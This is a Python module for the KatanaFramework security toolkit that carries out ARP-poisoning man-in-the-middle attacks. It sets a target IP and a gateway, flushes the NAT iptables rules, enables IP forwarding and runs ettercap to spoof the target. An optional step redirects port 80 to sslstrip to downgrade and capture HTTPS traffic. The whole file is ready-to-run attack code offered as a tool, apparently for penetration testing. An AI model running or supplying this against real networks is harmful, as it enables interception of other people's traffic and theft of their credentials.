# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
from core.Function import get_gateway,isConect,Subprocess,checkDevice,get_interfaces
import commands
# END LIBRARIES  

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="3.1"
	init.Description        ="ARP Poisoning"
	init.CodeName           ="net/arp.pson"
	init.DateCreation       ="26/08/2015"      
	init.LastModification   ="27/07/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME      VALUE               RQ     DESCRIPTION
		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
		'target'   :["192.168.1.223"   ,True ,'Target IP'],
		'gateway'  :[get_gateway()     ,True ,'Gateway IP'],
		'https'    :[True              ,False,'HTTP/s Capture']
	}

	init.aux = """
 Devices Founds: """+str(get_interfaces())+"""
	"""
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	
	if isConect() and checkDevice(init.var['interface']):
		printAlert(0,"Starting ARP Poisoning [ettercap].")
		commands.getoutput("iptables --flush -t nat")
		commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
		Subprocess("ettercap -T -M ARP /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
		if init.var['https']:
			printAlert(0,"Starting SSL Capturing [sslstrip].")
			commands.getoutput("sudo fuser -kuv 10000/tcp  >/dev/null 2>&1 ")
			commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
			commands.getoutput("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
			Subprocess("sslstrip")
		raw_input(printAlert(8,"to Stop ARP Attack (PRESS ANY KEY)\n"))
		commands.getoutput("killall ettercap")
		commands.getoutput("killall sslstrip")
		commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
		commands.getoutput("iptables --flush -t nat")

# END CODE MODULE ############################################################################################
